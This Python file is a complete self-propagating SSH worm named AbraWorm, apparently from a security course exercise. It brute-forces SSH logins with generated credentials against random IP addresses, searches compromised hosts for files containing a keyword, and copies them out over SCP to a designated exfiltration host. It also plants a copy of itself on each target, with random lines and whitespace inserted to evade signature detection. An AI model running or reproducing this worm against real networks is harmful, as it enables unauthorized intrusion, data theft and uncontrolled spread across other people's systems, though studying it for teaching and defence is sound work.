#!/usr/bin/env python

import sys
import os
import random
import paramiko
import scp
import select
import signal
import string

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1      # IMPORTANT:  Before changing this setting, read the last
               #             paragraph of the main comment block above. As
               #             mentioned there, you need to provide two IP
               #             addresses in order to run this code in debug 
               #             mode. 

NHOSTS = NUSERNAMES = NPASSWDS = 3


trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['root']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] 
          if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['mypassword']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) 
                if random.random() > 0.5 else '') if int(selector[x]) == 1 
                        else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

# '172.17.0.2', '172.17.0.3', '172.17.0.4', '172.17.0.5', '172.17.0.6', '172.17.0.7',
#                       '172.17.0.8', '172.17.0.9', '172.17.0.10', '172.17.0.11'

def get_fresh_ipaddresses(how_many):
    if debug: return ['172.17.0.2']   

    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 


def generate_random_string(size):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(size))


while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
#    print("usernames: %s" % str(usernames))
#    print("passwords: %s" % str(passwds))
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously 
                    # infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error: 
                        print(error)
                    
                    received_list = stdout.readlines()
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    
                    if ''.join(received_list).find('AbraWorm') >= 0: 
                        print("\nThe target machine is already infected\n")      
                        continue
                    
                    cmd = "grep -ls abracadabra -r"
                    # Now let's look for files that contain the string 'abracadabra'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    print("Debug")
                    error = stderr.readlines()
                    if error:
                        print('Error in executing command: %s' %cmd) 
                        print(error)
                        continue
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))
                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                    # Now deposit a copy of AbraWorm.py at the target host:
                    
                    file = open(sys.argv[0],'r')
                    all_lines = file.readlines()
                    file.close()
                    num_lines = all_lines.__len__()
                    for i in range(7):    
                        line1 = random.randint(0, num_lines - 2)
                        line2 = line1 + 1
                        rand_size = random.randint(10, 20)
                        random_string = generate_random_string(rand_size)
                        all_lines = all_lines[:line1+1] + [random_string] + all_lines[line2:]

                    num_lines = all_lines.__len__()

                    for i in range(13):    
                        line1 = random.randint(0, num_lines - 1)
                        rand_size = random.randint(5, 10)
                        line = all_lines[line1]
                        random_line_with_spaces = line.strip() + ' ' * rand_size + '\n'
                        all_lines[line1] = random_line_with_spaces

                    file = open('AbraWorm.py', 'w')
                    file.writelines(all_lines)
                    file.close()
                    scpcon.put('AbraWorm.py')
                    print("\n\nAbraWorm.py deposited at the target host\n")
                    scpcon.close()
                    os.remove('AbraWorm.py')
                except Exception as e:
                    print("Exception: %s" % str(e))
                    continue
                # Now upload the exfiltrated files to a specially designated host,
                # which can be a previously infected host.  The worm will only 
                # use those previously infected hosts as destinations for 
                # exfiltrated files if it was able to send the login credentials
                # used on those hosts to its human masters through, say, a 
                # secret IRC channel. (See Lecture 29 on IRC)
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #  For exfiltration demo to work, you must provide an IP address and the login 
                        #  credentials in the next statement:
                        ssh.connect('172.17.0.3',port=22,username='root',password='mypassword',timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except: 
                        print("No uploading of exfiltrated files\n")
                        continue
    if debug: break
